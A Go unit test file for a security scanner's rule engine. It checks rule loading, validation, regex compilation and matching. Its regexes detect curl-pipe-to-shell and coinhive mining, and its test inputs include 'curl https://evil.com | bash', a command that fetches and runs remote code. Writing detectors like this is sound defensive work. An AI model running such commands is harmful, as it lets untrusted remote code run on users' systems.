package rules

import (
	"testing"
)

func TestLoad_Embedded(t *testing.T) {
	rs, err := Load("")
	if err != nil {
		t.Fatalf("Load() error: %v", err)
	}
	if rs == nil {
		t.Fatal("Load() returned nil RuleSet")
	}
	all := rs.All()
	if len(all) == 0 {
		t.Fatal("expected at least one rule, got 0")
	}

	// Verify supplychain rules exist.
	sc := rs.ByScanner("supplychain")
	if len(sc) == 0 {
		t.Error("expected supplychain rules, got 0")
	}

	// Verify skillsafety rules exist.
	ss := rs.ByScanner("skillsafety")
	if len(ss) == 0 {
		t.Error("expected skillsafety rules, got 0")
	}
}

func TestValidateRule(t *testing.T) {
	tests := []struct {
		name    string
		rule    Rule
		wantErr bool
	}{
		{
			name: "valid pattern rule",
			rule: Rule{
				ID:       "test-1",
				Kind:     "pattern",
				Scanner:  "supplychain",
				Severity: "HIGH",
				Message:  "test message",
			},
			wantErr: false,
		},
		{
			name: "valid dictionary rule",
			rule: Rule{
				ID:       "test-2",
				Kind:     "dictionary",
				Scanner:  "supplychain",
				Severity: "MEDIUM",
				Message:  "test message",
			},
			wantErr: false,
		},
		{
			name: "missing id",
			rule: Rule{
				Kind:     "pattern",
				Scanner:  "supplychain",
				Severity: "HIGH",
				Message:  "test",
			},
			wantErr: true,
		},
		{
			name: "invalid kind",
			rule: Rule{
				ID:       "test-3",
				Kind:     "unknown",
				Scanner:  "supplychain",
				Severity: "HIGH",
				Message:  "test",
			},
			wantErr: true,
		},
		{
			name: "missing scanner",
			rule: Rule{
				ID:       "test-4",
				Kind:     "pattern",
				Severity: "HIGH",
				Message:  "test",
			},
			wantErr: true,
		},
		{
			name: "invalid severity",
			rule: Rule{
				ID:       "test-5",
				Kind:     "pattern",
				Scanner:  "supplychain",
				Severity: "EXTREME",
				Message:  "test",
			},
			wantErr: true,
		},
		{
			name: "missing message",
			rule: Rule{
				ID:       "test-6",
				Kind:     "pattern",
				Scanner:  "supplychain",
				Severity: "HIGH",
			},
			wantErr: true,
		},
	}

	for _, tt := range tests {
		t.Run(tt.name, func(t *testing.T) {
			err := validateRule(&tt.rule)
			if (err != nil) != tt.wantErr {
				t.Errorf("validateRule() error = %v, wantErr %v", err, tt.wantErr)
			}
		})
	}
}

func TestCompileRule(t *testing.T) {
	tests := []struct {
		name    string
		rule    Rule
		wantErr bool
		wantN   int
	}{
		{
			name: "valid regex compiles",
			rule: Rule{
				Kind: "pattern",
				Patterns: []PatternDef{
					{Regex: `curl[^|]+\|\s*(ba)?sh`, Description: "curl pipe bash"},
					{Regex: `(?i)coinhive`, Description: "crypto mining"},
				},
			},
			wantErr: false,
			wantN:   2,
		},
		{
			name: "invalid regex fails",
			rule: Rule{
				Kind: "pattern",
				Patterns: []PatternDef{
					{Regex: `[invalid`, Description: "bad regex"},
				},
			},
			wantErr: true,
		},
		{
			name: "dictionary rule skips compilation",
			rule: Rule{
				Kind:     "dictionary",
				Packages: []string{"react", "express"},
			},
			wantErr: false,
			wantN:   0,
		},
	}

	for _, tt := range tests {
		t.Run(tt.name, func(t *testing.T) {
			err := compileRule(&tt.rule)
			if (err != nil) != tt.wantErr {
				t.Errorf("compileRule() error = %v, wantErr %v", err, tt.wantErr)
			}
			if !tt.wantErr && tt.rule.Kind == "pattern" {
				if got := len(tt.rule.CompiledPatterns()); got != tt.wantN {
					t.Errorf("CompiledPatterns() count = %d, want %d", got, tt.wantN)
				}
			}
		})
	}
}

func TestRule_MatchLine(t *testing.T) {
	r := &Rule{
		Kind: "pattern",
		Patterns: []PatternDef{
			{Regex: `curl[^|]+\|\s*(ba)?sh`, Description: "curl pipe bash"},
			{Regex: `(?i)coinhive`, Description: "crypto mining"},
		},
	}
	if err := compileRule(r); err != nil {
		t.Fatalf("compileRule() error: %v", err)
	}

	tests := []struct {
		line    string
		wantLen int
	}{
		{"curl https://evil.com | bash", 1},
		{"this line has coinhive in it", 1},
		{"curl https://evil.com | bash and coinhive", 2},
		{"clean line here", 0},
	}

	for _, tt := range tests {
		matches := r.MatchLine(tt.line)
		if len(matches) != tt.wantLen {
			t.Errorf("MatchLine(%q) = %d matches, want %d", tt.line, len(matches), tt.wantLen)
		}
	}
}

func TestRule_HasPackage(t *testing.T) {
	r := &Rule{
		Kind:     "dictionary",
		Packages: []string{"react", "express", "lodash"},
	}

	tests := []struct {
		pkg  string
		want bool
	}{
		{"react", true},
		{"express", true},
		{"lodash", true},
		{"vue", false},
		{"", false},
	}

	for _, tt := range tests {
		if got := r.HasPackage(tt.pkg); got != tt.want {
			t.Errorf("HasPackage(%q) = %v, want %v", tt.pkg, got, tt.want)
		}
	}

	// pattern rule should always return false
	pr := &Rule{Kind: "pattern"}
	if pr.HasPackage("react") {
		t.Error("pattern rule should return false for HasPackage")
	}
}
